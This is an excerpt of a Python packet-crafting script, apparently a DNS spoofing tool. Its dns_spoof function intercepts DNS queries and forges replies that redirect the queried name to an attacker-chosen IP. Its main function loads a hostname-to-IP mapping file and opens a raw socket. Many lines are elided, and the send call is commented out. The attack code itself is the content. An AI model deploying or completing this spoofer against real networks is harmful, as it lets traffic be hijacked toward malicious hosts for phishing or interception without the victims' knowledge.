...
def dns_spoof(pkt):
    if pkt.dport == 53 and UDP in pkt and DNSRR not in pkt:
        ...
        # spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
        #               UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
        #               DNS(id=pkt[DNS].id, qr=1, rd=1, ra=1, qd=pkt[DNS].qd, \
        #                   an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata='6.6.6.6'))
        ...
        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) \
                  ...
                  / DNS(id=pkt[DNS].id,
                        ...
                        an=DNSRR(rrname=pkt[DNS].qd.qname, rdata='98.138.253.109')
                )
        ...
        print('opcode = ' + str(spoofed_pkt[DNS].opcode))
        #send(spoofed_pkt)
        print 'sending to: ' + pkt[IP].src
...
def main():
    ...
    if args.f is not None:
        ...
        for line in f:
            ...
            if len(line) != 2:
                continue
            hosts[line[0].strip()] = line[1].strip()

        f.close()

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        print 'got raw socket'
